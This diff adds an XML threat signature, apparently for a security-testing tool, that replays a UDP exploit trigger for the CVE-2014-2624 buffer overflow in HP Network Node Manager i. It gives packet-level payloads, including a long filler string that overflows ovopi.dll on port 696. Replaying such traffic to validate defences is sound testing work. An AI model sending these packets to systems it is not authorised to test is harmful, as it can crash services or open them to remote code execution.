@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HP Network Node Manager I ovopi.dll -L Buffer Overflow"/>
+    <EngDesc display="true" value="Two buffer overflow vulnerabilities exist in HP Network Node Manager I (NNMi). These vulnerabilities are caused by copying user supplied data into fixed-size buffers without sufficient validation in ovopi.dll By sending a crafted request to the vulnerable product on port 696/UDP, a remote unauthenticated attacker could exploit these vulnerabilities to execute arbitrary code with System privileges. Tester should set variable $destPort to 696 before test."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HP NNMi pmd Protocol"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="HP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Network_Node_Manager_i_(NNMi)"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="9X"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140909-17"/>
+    <CVEID display="true" value="CVE-2014-2624"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="112516"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="eb74a188ce2a30c837e2ae68e89a4a4b"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635525995913930928"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1417084239" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="C">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:0D:66" destMac="00:50:56:B4:15:6E" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="002C" Identification="84FF" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="4CF5" srcIP="172.16.8.111" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="43312" destPort="$destPort" checksum="398D" length="0018" Payload="A5020000586200000C0A0000A80C0000"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="C" Count="">
+    <Ethernet srcMac="00:50:56:B4:0D:66" destMac="00:50:56:B4:15:6E" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0182" Identification="8500" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="4B9E" srcIP="172.16.8.111" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="43312" destPort="$destPort" checksum="DEDA" length="016E" Payload="A90200002D4C33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:15:6E" destMac="00:50:56:B4:0D:66" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0024" Identification="04F2" FragmentOffset="0000" TTL="80" Protocol="11" HeaderChecksum="CD0A" srcIP="$destIP" destIP="172.16.8.111" options="" CE="false" DF="false" MF="false">
+          <UDP srcPort="$destPort" destPort="43312" checksum="4616" length="0010" Payload="A50200000000000000000000000000000000"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
